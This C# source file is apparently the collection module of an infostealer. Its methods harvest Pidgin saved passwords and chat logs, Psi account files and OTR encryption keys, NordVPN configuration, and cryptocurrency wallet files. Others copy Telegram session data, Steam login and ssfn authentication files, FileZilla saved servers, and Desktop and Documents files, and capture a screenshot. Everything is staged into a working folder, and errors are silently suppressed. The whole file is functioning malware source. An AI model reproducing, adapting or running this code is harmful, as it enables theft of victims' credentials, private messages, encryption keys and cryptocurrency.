using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Xml;

namespace who.Func
{
    class Grab
    {
        public static int Weight;

        public static void PidginLogsGrabber()
        {
            string PidginPath = Path.Combine(Dirs.AppData, @".purple\logs\jabber");

            if (Directory.Exists(PidginPath))
            {                
                Directory.CreateDirectory(Dirs.WorkDir + "\\Pidgin\\Logs");
                Copy(PidginPath, Dirs.WorkDir + "\\Pidgin\\Logs");
            }
        }

        public static void Copy(string sourceDirectory, string targetDirectory)
        {
            DirectoryInfo diSource = new DirectoryInfo(sourceDirectory);
            DirectoryInfo diTarget = new DirectoryInfo(targetDirectory);

            CopyAll(diSource, diTarget);
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            try
            {
                foreach (FileInfo fi in source.GetFiles())
                {                    
                    fi.CopyTo(Path.Combine(target.ToString(), fi.Name), true);
                }

                foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
                {
                    DirectoryInfo nextTargetSubDir =
                      target.CreateSubdirectory(diSourceSubDir.Name);

                    CopyAll(diSourceSubDir, nextTargetSubDir);
                }
            }

            catch { }
        }

        public static void PSI()
        {
            string psi = Dirs.AppData + @"\Psi\profiles\default\";

            try
            {


                if (Directory.Exists(psi))
                {
                    Directory.CreateDirectory(Dirs.WorkDir + @"\Psi");
                    string[] psifiles = Directory.GetFiles(psi); 

                    foreach (string x in psifiles)
                    {
                        try
                        {
                            FileInfo f = new FileInfo(x);
                            if (f.Name == "accounts.xml")
                            {
                                File.Copy(x, Dirs.WorkDir + @"\Psi\accounts.xml"); 
                            }
                            if (f.Name == "otr.keys")
                            {
                                File.Copy(x, Dirs.WorkDir + @"\Psi\otr.keys");
                            }
                            if (f.Name == "otr.fingerprints")
                            {
                                File.Copy(x, Dirs.WorkDir + @"\Psi\otr.fingerpits");
                            }
                        }
                        catch
                        {
                        }

                    }
                }
            }
            catch
            {
            }
        }

        public static void NordVPN()
        {
            try
            {
               
                if (Directory.Exists(Dirs.AppData + @"\NordVPN"))
                {
                    string[] dirs = Directory.GetDirectories(Dirs.AppData + @"\NordVPN");
                    Directory.CreateDirectory(Dirs.WorkDir + "\\NordVPN");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(Dirs.AppData + @"\NordVPN" + @"\NordVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\NordVPN\" + dirName + @"\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + @"\user.config", Dirs.WorkDir + "\\NordVPN"  + dirName + @"\" + new DirectoryInfo(d1[0]).Name + @"\user.config");
                        }
                    }
                }
            }
            catch
            {

            }

        }

        public static void DirSearch(string sDir)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    try
                    {
                        if (d == Dirs.AppData + @"\Microsoft") continue;
                        if (d == Dirs.LocalAppData + @"\Application Data") continue;
                        if (d == Dirs.LocalAppData + @"\History") continue;
                        if (d == Dirs.LocalAppData + @"\Microsoft") continue;
                        if (d == Dirs.LocalAppData + @"\Temporary Internet Files") continue;
                        string[] files = Directory.GetFiles(d);
                        foreach (string f in files)
                        {
                            FileInfo ff = new FileInfo(f);
                            if (ff.Name == "wallet.dat" || ff.Name == "wallet" || ff.Name == "default_wallet.dat" || ff.Name == "default_wallet" || ff.Name.EndsWith("wallet") || ff.Name.EndsWith("bit") || ff.Name.StartsWith("wallet"))
                            {
                                Directory.CreateDirectory(Dirs.WorkDir + "\\Wallets");
                                try
                                {
                                    if (ff.Name.EndsWith(".log"))
                                    {
                                        continue;
                                    }
                                    string newpath = new DirectoryInfo(d).Name;
                                    Directory.CreateDirectory(Dirs.WorkDir + "\\Wallets\\" + newpath);
                                    File.Copy(f, Dirs.WorkDir + "\\Wallets\\" + newpath + @"\" + ff.Name);
                                }
                                catch
                                {
                                }

                            }
                        }
                    }
                    catch
                    {
                    }

                    DirSearch(d);
                }
            }
            catch
            {

            }
        }


        public static List<string> extensions = new List<string>()
            {
            
        };

        public static void NewTelegram()
        {
            string[] TelegramFiles = new string[]
                           {
                                 "\\D877F783D5D3EF8C1", "\\D877F783D5D3EF8C0",
                        "\\D877F783D5D3EF8C\\map1", "\\D877F783D5D3EF8C\\map0"
                           };

            try
            {
                if (Process.GetProcessesByName("Telegram").Length != 0)
                {
                    Process process = Process.GetProcessesByName("Telegram")[0];
                    ProcessModuleCollection modules = process.Modules;

                    //Console.WriteLine("Telegram in process!");

                    foreach (ProcessModule module in modules)
                    {
                        string filename = module.FileName;
                        string path = filename.Remove(filename.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";                       

                        if (Directory.Exists(path))
                            Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram");

                        if (!Directory.Exists(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C"))
                            Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C");

                        foreach (string file in TelegramFiles)
                        {
                            try
                            {
                                File.Copy(path + file, $"{Dirs.WorkDir}\\Telegram{file}", overwrite: true);
                            }
                            catch
                            { }
                        }
                    }
                }

                else
                {
                    RegistryKey keytelega = Registry.CurrentUser.OpenSubKey(@"Software\Classes\tdesktop.tg\DefaultIcon");
                    string strtg = (string)keytelega.GetValue(null);
                    keytelega.Close();

                    string path = strtg.Remove(strtg.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";

                    if (Directory.Exists(path))
                        Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram");

                    if (!Directory.Exists(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C"))
                        Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C");

                    foreach (string file in TelegramFiles)
                    {
                        try
                        {
                            File.Copy(path + file, $"{Dirs.WorkDir}\\Telegram{file}", overwrite: true);
                        }
                        catch 
                        {
                        }
                    }
                }
            }
            catch 
            {

            }
        }   

        public static void Pidgin() //NEW!
        {

            StringBuilder stringBuilder = new StringBuilder();
            string PathPn = Path.Combine(Dirs.AppData, @".purple\accounts.xml");

                if (File.Exists(PathPn))
                {
                    try
                    {
                        XmlDocument xs = new XmlDocument();
                        xs.Load(new XmlTextReader(PathPn));
                        foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                        {
                            string Protocol = nl.ChildNodes[0].InnerText;
                            string Login = nl.ChildNodes[1].InnerText;
                            string Password = nl.ChildNodes[2].InnerText;
                            if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                            {
                                stringBuilder.AppendLine("Protocol: " + Protocol);
                                stringBuilder.AppendLine("Login: "  + Login);
                                stringBuilder.AppendLine("Password: " + Password + "\r\n");
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (stringBuilder.Length > 0)
                        {
                        Directory.CreateDirectory(Dirs.WorkDir + "\\Pidgin");

                            try
                            {
                                File.AppendAllText(Dirs.WorkDir + "\\Pidgin\\Logins.txt", stringBuilder.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }

                PidginLogsGrabber();
                }           
        }

        public static void Desktop() //
        {
            
            Directory.CreateDirectory(Dirs.WorkDir + "\\Desktop");
            Directory.CreateDirectory(Dirs.WorkDir + "\\Documents");

            DirectoryInfo DocInfo = new DirectoryInfo(Dirs.Documents);
            DirectoryInfo DskInfo = new DirectoryInfo(Dirs.Desktop);
            
            try
            {
                foreach (FileInfo file in DskInfo.GetFiles())
                {
                    foreach (string exten in extensions)
                    {
                        if (file.Extension.Equals(exten) && file.Length <= Weight)
                        {
                            file.CopyTo(Dirs.WorkDir + "\\Desktop\\" + file.Name);
                        }
                    }
                }
            }

            catch { }

            
            foreach (var dir in DskInfo.GetDirectories())
            {
                    foreach (var file in dir.GetFiles())
                    {
                    foreach (var exten in extensions)
                    {
                        if (file.Extension.Equals(exten) && file.Length <= Weight)
                        {
                            try
                            {
                                if (!Directory.Exists($"{Dirs.WorkDir}\\Desktop\\{dir}"))
                                {
                                    Directory.CreateDirectory($"{Dirs.WorkDir}\\Desktop\\{dir}");
                                }
                                file.CopyTo($"{Dirs.WorkDir}\\Desktop\\{dir}\\{file}");
                            }

                            catch { }
                        }
                    }   
                    }                
            }
            
            try
            {
                foreach (FileInfo file in DocInfo.GetFiles())
                {
                    foreach (string exten in extensions)
                    {
                        if (file.Extension.Equals(exten) && file.Length <= Weight)
                        {
                            file.CopyTo(Dirs.WorkDir + "\\Documents\\" + file.Name);
                        }
                    }
                }
            }

            catch { }
            
        }

        public static void ScreenShot() //
        {
            Bitmap Screenshot;
            int width = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
            int height = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());

            Screenshot = new Bitmap(width, height); 
            Size s = new Size(Screenshot.Width, Screenshot.Height); 
            Graphics memoryGraphics = Graphics.FromImage(Screenshot);
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string screenpath = Dirs.WorkDir + "\\screenshot.jpg"; 
            Screenshot.Save(screenpath); 
        }


        public static void Steam() //
        {
            string[] SteamFiles = new string[]
                {
                    "config.vdf", "loginusers.vdf", "DialogConfig.vdf"
                };

            bool Stm = Directory.Exists(Dirs.Steam);
            if (Stm)
            {
                Dirs.LogPC.Add("[✅] Steam");

                Directory.CreateDirectory(Dirs.SteamDir);
                Directory.CreateDirectory(Dirs.SteamDir + "\\config");

                foreach (string file in SteamFiles)
                {
                    try {
                        File.Copy($"{Dirs.Config}\\{file}", $"{Dirs.SteamDir}\\config\\{file}");
                    }

                    catch {  }
                }

                DirectoryInfo StmInfo = new DirectoryInfo(Dirs.Steam);
                foreach (FileInfo file in StmInfo.GetFiles("ssfn*"))
                {
                    File.Copy(file.FullName, Dirs.SteamDir + "\\" + file.Name, true);
                }            
            }
        }

        public static void FileZilla() //
        {
            bool Flz = Directory.Exists(Dirs.FileZilla);
            if (Flz)
            {
                Dirs.LogPC.Add("[✅] FileZilla");

                string[] FZFiles = new string[]
                    {
                        "recentservers.xml", "sitemanager.xml"
                    };
                if (!Directory.Exists(Dirs.WorkDir + "\\FileZilla"))
                    Directory.CreateDirectory(Dirs.WorkDir + "\\FileZilla");

                foreach (string file in FZFiles)
                {
                    try
                    {
                        File.Copy($"{Dirs.FileZilla}\\{file}", $"{Dirs.WorkDir}\\FileZilla\\{file}");
                    }

                    catch { }                   
                }
            }
        }              
    }
}
